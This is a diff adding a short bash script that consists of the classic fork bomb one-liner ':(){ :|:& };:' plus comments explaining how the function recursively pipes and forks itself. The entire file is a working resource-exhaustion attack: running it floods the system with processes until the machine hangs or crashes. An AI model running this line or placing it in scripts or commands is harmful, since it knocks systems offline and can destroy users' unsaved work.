@@ -1,0 +1,6 @@
+#!/usr/bin/env bash
+:(){ :|:& };:
+
+# define a function : which runs itself, pipes that to itself and forks that to
+# background
+# then run :
